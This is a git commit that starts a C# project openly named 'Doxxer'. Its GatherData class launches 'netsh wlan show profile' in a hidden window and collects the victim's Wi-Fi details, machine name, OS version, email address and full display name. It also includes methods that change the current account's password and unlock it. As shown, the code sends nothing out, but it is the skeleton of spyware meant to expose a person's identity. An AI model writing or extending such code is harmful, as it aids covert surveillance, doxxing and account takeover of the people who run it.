facd5c96dbd315bc04f7e0b41f2ff7b3b2bff2ca
PupJoey <james.lawrence@live.co.uk>
2023-03-01 00:16:07 +0000

    Init

---
+++ Doxxer/GatherData.cs
@@ -0,0 +1,87 @@
+﻿using System;
+using System.Diagnostics;
+using System.DirectoryServices.AccountManagement;
+using SimpleWifi;
+
+namespace Doxxer
+{
+    public class GatherData
+    {
+        public GatherData()
+        {
+            GetWifi();
+            getFullName();
+        }
+
+        private string GetWifi()
+        {
+            Process wifiProcess = new Process();
+            wifiProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            wifiProcess.StartInfo.FileName = "netsh";
+            wifiProcess.StartInfo.Arguments = "wlan show profile";
+            wifiProcess.StartInfo.UseShellExecute = false;
+            wifiProcess.StartInfo.RedirectStandardError = true;
+            wifiProcess.StartInfo.RedirectStandardInput = true;
+            wifiProcess.StartInfo.RedirectStandardOutput = true;
+            wifiProcess.StartInfo.CreateNoWindow = true;
+            wifiProcess.Start();
+            string output = wifiProcess.StandardOutput.ReadToEnd();
+            wifiProcess.WaitForExit();
+            return output;
+        }
+
+        private AccessPoint getConnectedWifi()
+        {
+            Wifi wifi = new Wifi();
+            foreach (var connection in wifi.GetAccessPoints())
+            {
+                if (connection.IsConnected)
+                {
+                    return connection;
+                }
+            }
+
+            return null;
+        }
+
+        private string getComputerName()
+        {
+            return Environment.MachineName;
+        }
+
+        private Version getRuntimeVersion()
+        {
+            return Environment.Version;
+        }
+
+        private OperatingSystem getOSVersion()
+        {
+            return Environment.OSVersion;
+        }
+
+        private string getDirectory()
+        {
+            return Environment.SystemDirectory;
+        }
+        
+        private string getUserEmail()
+        {
+            return UserPrincipal.Current.EmailAddress;
+        }
+        
+        private string getFullName()
+        {
+            return UserPrincipal.Current.DisplayName;
+        }
+        
+        private void setAccountPassword(String newPassword)
+        {
+            UserPrincipal.Current.SetPassword(newPassword);
+        }
+        
+        private void unlockAccount()
+        {
+            UserPrincipal.Current.UnlockAccount();
+        }
+    }
+}
---
+++ Doxxer/Program.cs
@@ -0,0 +1,11 @@
+﻿using System;
+
+namespace Doxxer
+{
+    class Program {
+        static void Main(string[] args)
+        {
+            new GatherData();
+        }
+    }
+}
